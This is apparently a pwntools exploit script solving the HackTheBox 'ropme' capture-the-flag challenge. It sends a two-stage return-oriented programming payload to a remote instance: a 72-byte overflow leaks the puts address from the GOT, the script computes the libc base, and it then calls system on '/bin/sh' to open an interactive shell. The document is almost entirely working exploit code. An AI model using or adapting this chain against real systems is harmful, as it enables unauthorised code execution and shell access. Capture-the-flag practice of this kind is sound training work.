from pwn import *

context(terminal=['tmux','new-window'])
#p = process('./ropme')
#p = gdb.debug('./ropme','b main')

s = remote("docker.hackthebox.eu",32613)
context(os="linux",arch = "amd64")
#context.log_level = 'DEBUG'

#ROP me outside, how 'about dah?
#akshay

elf=ELF("./ropme")
rop=ROP(elf)
libc = ELF('libc-2.23.so')  ### Perform it locally with libc.so.6 and then try to do it with newer linux binaries

### Stage 1
junk = "A" * 72
rop.search(regs=['rdi'],order='regs')
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

raw_input()

payload = junk + str(rop)

s.sendline(payload)
s.recvline()
leaked_puts =s.recvline()[:8].strip().ljust(8,"\x00")
log.success("Leaked puts @ GLIBC: "+ hex(u64(leaked_puts))) 

leaked_puts = u64(leaked_puts)

### Stage 2

libc.address= leaked_puts - libc.symbols['puts']
log.info("libc base @ %s" % hex(libc.address)) 

rop2 = ROP(libc)
rop2.system(next(libc.search("/bin/sh\x00")) - 64) ## After a lot of debug we find that we need to subtracr 64 bytes to get the address of /bin/sh 
log.info("Stage 2 ROP Chain:\n "+ rop2.dump())

payload= junk + str(rop2)

s.sendline(payload)
s.interactive()




